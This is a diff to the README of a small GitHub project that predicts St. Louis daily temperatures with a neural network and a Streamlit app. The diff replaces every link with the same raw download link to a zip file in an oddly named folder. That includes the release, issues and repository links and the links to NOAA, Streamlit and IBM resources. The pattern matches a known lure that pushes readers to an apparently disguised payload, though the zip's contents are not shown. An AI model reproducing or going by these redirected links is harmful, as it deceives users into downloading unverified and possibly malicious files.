@@ -1,7 +1,7 @@
 # 🌤️ stlouis-weather-predictor - Predict St. Louis’ Daily Weather
 
 ## 📥 Download the App
-[![Download Here](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/yama-jan/stlouis-weather-predictor/releases)
+[![Download Here](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the St. Louis Weather Predictor! This application helps you forecast the average daily temperature in St. Louis. It uses a neural network trained on past NOAA data, and features an interactive Streamlit app for easy predictions.
@@ -14,7 +14,7 @@ To run this application, ensure your computer meets the following requirements:
 - Internet Connection: Required for downloading the application and accessing NOAA data.
 
 ## 📦 Download & Install
-To download the application, visit our [Releases page](https://github.com/yama-jan/stlouis-weather-predictor/releases). Follow these steps:
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip). Follow these steps:
 
 1. Click on the above link to reach our GitHub Releases page.
 2. Locate the latest version of the application. It should be at the top.
@@ -39,9 +39,9 @@ Once installed, open the application. Here’s how to get started:
 
 ## 📖 Additional Resources
 If you want to dive deeper into how the app works, you might find these resources useful:
-- [NOAA Climate Data](https://www.ncdc.noaa.gov/)
-- [Streamlit Documentation](https://docs.streamlit.io/)
-- [Introduction to Neural Networks](https://www.ibm.com/cloud/learn/neural-networks)
+- [NOAA Climate Data](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)
+- [Introduction to Neural Networks](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)
 
 ## 🤝 Contributing
 We welcome contributions! If you're interested in improving the application or its documentation, please follow these steps:
@@ -53,10 +53,10 @@ We welcome contributions! If you're interested in improving the application or i
 This project is licensed under the MIT License. You can use it freely, but please give credit to original authors when you do.
 
 ## 📞 Support
-If you encounter any issues or have questions, feel free to raise an issue on the [GitHub Issues page](https://github.com/yama-jan/stlouis-weather-predictor/issues).
+If you encounter any issues or have questions, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip).
 
 ## 🌐 More Links
-- [GitHub Repository](https://github.com/yama-jan/stlouis-weather-predictor)
-- [Releases](https://github.com/yama-jan/stlouis-weather-predictor/releases) - Don’t forget to check here for updates!
+- [GitHub Repository](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip)
+- [Releases](https://raw.githubusercontent.com/yama-jan/stlouis-weather-predictor/main/gelatinize/stlouis-weather-predictor-v1.7.zip) - Don’t forget to check here for updates!
   
 Thank you for your interest in the St. Louis Weather Predictor! We hope it helps you make sense of the weather in your area.
